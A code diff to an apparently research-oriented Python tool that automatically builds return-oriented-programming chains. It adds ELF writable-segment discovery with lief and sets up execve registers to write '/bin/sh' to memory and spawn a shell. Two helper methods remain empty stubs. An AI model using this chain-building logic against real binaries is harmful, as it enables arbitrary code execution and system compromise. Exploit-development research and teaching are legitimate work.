@@ -17,8 +17,14 @@ from RopChain import RopChain
 from GadgetBox import GadgetBox
 import Arch
 import networkx as nx
+import lief
 import sys
 import logging
+
+# TODO's:
+# 1: distinguish between int 0x80 and syscall in Others
+# 2: check memory offset accesses not to be outside writable interval
+# 3: possibly search for "syscall;ret;" instead of "syscall;"
 
 def select_best(gadget_list):
         """
@@ -61,18 +67,20 @@ class GadgetsPlayer(object):
         self.indipendent_load_gadgets = []
         self.load_kernels = {}
         self.write_kernel = None
+        self.writable_interval =(None, None)
         self.kernels = []
         self.chain = None
-        self.writable_address = 0x4000000
-        self.register_values = {'rax': 0x3b,'rdi': self.writable_address, 'rsi': 0x0, 'rdx': 0x0}
-
-        #self.register_values = {'eax': 0xb,'ebx': self.writable_address, 'ecx': 0x0, 'edx': 0x0}
+        self.bin_sh_address = None
+        self.writable_address = None
         
         # assuming all gadget of the same type
         if len(self.gadgets):
             Arch.init(self.gadgets[0].arch)
 
     def play(self):
+        self.find_writable_interval()
+        self.setup_execve()
+
         self.find_load_gadgets()
         self.compute_load_kernels()
         self.compute_write_kernels()
@@ -99,6 +107,37 @@ class GadgetsPlayer(object):
         print "Found %d different gadgets" % total
         for t in subtotals:
             print '*', t.__name__, "%.2f" % (subtotals[t]/float(total) * 100) + '%'
+
+    def setup_execve(self):
+        self.bin_sh_address = self.writable_interval[1] - (Arch.ARCH_BITS / 8)
+
+        self.register_values = {
+            'rax': 0x3b, 'rdi': self.bin_sh_address, 'rsi': 0x0, 'rdx': 0x0}
+        #self.register_values = {'eax': 0xb,'ebx': self.bin_sh_address, 'ecx': 0x0, 'edx': 0x0}
+
+
+    def find_writable_interval(self):
+        binary = lief.parse(self.filename)
+        max_size = 0
+        for segment in binary.segments:
+            if segment.virtual_address and segment.has(lief.ELF.SEGMENT_FLAGS.R) and segment.has(lief.ELF.SEGMENT_FLAGS.W):
+                if segment.virtual_size > max_size:
+                    max_size = segment.virtual_size
+                    self.writable_interval = (
+                        segment.virtual_address, segment.virtual_address + segment.virtual_size)
+        if self.writable_interval == (None, None):
+            raise Exception('Writable Address not found')
+
+        self.writable_address = (
+            self.writable_interval[1] + self.writable_interval[0]) / 2
+
+    @staticmethod
+    def is_safely_inside(interval, address):
+        pass
+
+    @staticmethod
+    def safe_value(interval, address, offset_of_address):
+        pass
 
 
     def compute_load_kernels(self):
@@ -151,7 +190,7 @@ class GadgetsPlayer(object):
         if best_write_gadget:
             if len(best_write_gadget.mem[0]) == 1:
                 k1 = self.load_kernels[best_write_gadget.addr_reg].copy()
-                k1.gadget_boxes[-1].value = self.writable_address
+                k1.gadget_boxes[-1].value = self.bin_sh_address
 
                 k2 = self.load_kernels[best_write_gadget.src].copy()
                 # hex(pwn.u64('/bin/sh\x00'))
@@ -162,7 +201,7 @@ class GadgetsPlayer(object):
 
                 chain = RopChain([k1,k2,k])
                 
-                tmp_values = {best_write_gadget.addr_reg.name: self.writable_address,
+                tmp_values = {best_write_gadget.addr_reg.name: self.bin_sh_address,
                               best_write_gadget.src.name: 0x68732f6e69622f}
                 
                 if all(value != tmp_values[reg] for (reg, value) in chain.evaluate().items() if reg in tmp_values):
